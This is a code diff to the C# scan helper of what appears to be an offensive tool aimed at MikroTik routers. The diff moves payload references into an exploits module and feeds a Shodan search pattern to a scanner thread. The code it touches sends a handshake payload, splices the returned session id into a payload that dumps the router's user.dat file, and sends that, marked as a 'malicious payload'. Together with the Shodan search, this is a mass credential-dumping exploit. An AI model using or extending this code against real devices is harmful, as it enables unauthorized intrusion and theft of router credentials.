@@ -12,6 +12,7 @@ using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using OelianderUI.Views;
 using System.Windows.Threading;
+using OelianderUI.Helpers.Exploits;
 
 namespace OelianderUI.Helpers;
 
@@ -95,7 +96,7 @@ public class ScanHelper
                 return null;
             }
 
-            Socket.Send(Payloads.Hello_Payload);
+            Socket.Send(MTIKPayloads.Hello_Payload);
 
             ResponseBytes = new byte[BufferSize];
             try { Socket.Receive(ResponseBytes, BufferSize, SocketFlags.None); }
@@ -112,7 +113,7 @@ public class ScanHelper
             }
 
             // inject session id into dump payload
-            var DumpPayload = Payloads.UserDatPayload;
+            var DumpPayload = MTIKPayloads.UserDatPayload;
             DumpPayload[19] = ResponseBytes[38];
             Socket.Send(DumpPayload); // send malicious payload
 
@@ -452,6 +453,7 @@ public class ScanHelper
                 {
                     mainFormObject.AddLog($"[!] [{DateTime.Now.ToString("G")}]: Shodan Scan Started!\n\n");// + Environment.NewLine);
                 });
+                ShodanScanner.searchPattern = MTIKPayloads.Shodan_Pattern;
                 threadRunner = new Thread(ShodanScanner.GetShodanSearch);
                 threadRunner.Start();
                 do
